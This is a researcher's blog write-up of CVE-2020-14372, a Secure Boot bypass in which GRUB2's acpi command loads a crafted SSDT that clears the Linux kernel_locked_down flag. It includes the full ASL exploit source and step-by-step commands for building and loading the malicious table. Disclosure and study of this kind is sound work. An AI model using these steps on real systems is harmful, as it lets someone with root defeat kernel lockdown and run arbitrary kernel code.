<!-- Copyright (C) Máté Kukri, 2021 -->
<!-- NOTE: generated HTML, do *NOT* edit by hand -->
<!DOCTYPE html>
<html lang="en-us">
<head>
	<meta charset="utf-8" />

	<title>CVE-2020-14372: Secure Boot bypass using GRUB2</title>
	<meta name="description" content="Bypassing (not so) Secure Boot with one "simple trick"">
	<meta name="keywords" content="CVE-2020-14372,writeup,POC, GRUB2,UEFI,SecureBoot">
	<meta name="author" content="Máté Kukri">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="theme-color" content="#000000"/>

	<link rel="stylesheet" type="text/css" href="/res/style.css" />
</head>
<body>
	<ul id="navbar">
		<li><a href="/index.html">blog</a></li>
<li><a href="https://github.com/kukrimate">projects</a></li>

	</ul>
	<h1>CVE-2020-14372: Secure Boot bypass using GRUB2</h1>
	<b>2021-05-22 17:11</b>
	<div>
		<h2>Vulnerability details</h2>
<p>One day I typed &quot;help&quot; into GRUB2's console and saw some really &quot;fun&quot;
commands:</p>
<ul><li> read_byte ADDR:      Read 8-bit value from ADDR</li><li> write_byte ADDR VAL: Write 8-bit value VAL to ADDR</li></ul>
<p>I immediately thought I found the most fun Secure Boot bypass, but these
commands output the following under Secure Boot:</p>
<pre><code>error: Secure Boot forbids loading module .../memrw.mod.
</code></pre>
<p>Out of curiosity, booted this way I typed the &quot;acpi&quot; command, and it printed
a usage message telling me to point it to an AML file. It's well-known that
another name for ACPI is a &quot;mechanism to run arbitrary vendor provided code
in the context of your kernel&quot;, since we can load ACPI tables with Secure Boot
enabled, we are the &quot;vendor&quot; who can provide that code.</p>
<p>But since there is a one-byte flag (kernel_locked_down) in the data segment of
the booted kernel telling it whether or not its &quot;locked down&quot;, we can just
overwrite that flag using an SSDT and let the kernel load arbitrary modules.</p>
<p>The following SSDT accomplishes this by creating a &quot;battery&quot; object called <code>HACK</code>,
and doing the write in said object's <code>_INI</code> method which is always executed by
the kernel:</p>
<pre><code>DefinitionBlock (&quot;trigger.aml&quot;, &quot;SSDT&quot;, 2, &quot;&quot;, &quot;&quot;, 0x00001001)
{
  OperationRegion (KMEM, SystemMemory, ADDRESS_GOES_HERE, 4)
  Field (KMEM, DWordAcc, NoLock, WriteAsZeros)
  {
    LKDN, 32
  }
  Device (\_SB_.HACK)
  {
    Name(_HID, EisaId (&quot;PNP0C0A&quot;))
    Name(_UID, 0x02)
    Method(_INI)
    {
      If (LKDN)
      {
        LKDN = Zero
      }
    }
  }
}
</code></pre>
<p>I wrote a proof of concept exploit in Python that helps with generating this SSDT,
but exploting this by hand is not that difficult either. The rough outline is as
follows:</p>
<ul><li> Disable KASLR by adding `nokaslr` to the kernel command line</li><li> Find the **physical** address of the `kernel_locked_down` symbol after booting
   without KASLR</li><li> Insert the address into the SSDT above, than compile that SSDT using `iasl`</li><li> Finally instruct GRUB2 to load the SSDT</li></ul>
<h2>How to use the PoC</h2>
<p>Proof of concept exploit hosted on &lt;a href=&quot;https://github.com/kukrimate/CVE-2020-14372&quot;&gt;GitHub&lt;/a&gt;.</p>
<p>Assumptions:</p>
<ul><li> The attacker has `root` access to the running operating system</li><li> Linux is booted under UEFI Secure Boot with GRUB2 version &lt;=2.02
  (some builds of 2.02 are patched), this will cause kernel lockdown to be enabled</li></ul>
<p>When the above assumptions are met, edit <code>/etc/default/grub</code>, add <code>nokaslr</code>
to <code>GRUB_CMDLINE_LINUX_DEFAULT</code>, run <code>update-grub</code>, and then finally reboot.</p>
<p>After the kernel is booted without address space layout randomization, the
<code>genssdt.py</code> script can be used to generate a &quot;malicious&quot; SSDT that will patch
the kernel's memory at runtime to disable lockdown:</p>
<pre><code>python3 genssdt.py &gt; trigger.dsl
iasl trigger.dsl
cp trigger.aml /boot/efi/evil_ssdt.aml
</code></pre>
<p>Now that the SSDT was created, the GRUB configuration file
(usually at <code>/boot/grub/grub.cfg</code>) must be edited to make GRUB load this SSDT
(adding this to the top of this file):</p>
<pre><code>acpi (hd0,gpt1)/evil_ssdt.aml
</code></pre>
<p>Based on where the EFI system partition (where we placed the SSDT above) resides
on disk, <code>(hd0,gpt1)</code> might need to be replaced with something else.</p>
<p>Finally after a reboot, kernel lockdown should be disabled, giving <code>root</code> the
ability to execute arbitrary code in the kernel.
</p>

	</div>
</body>
</html>
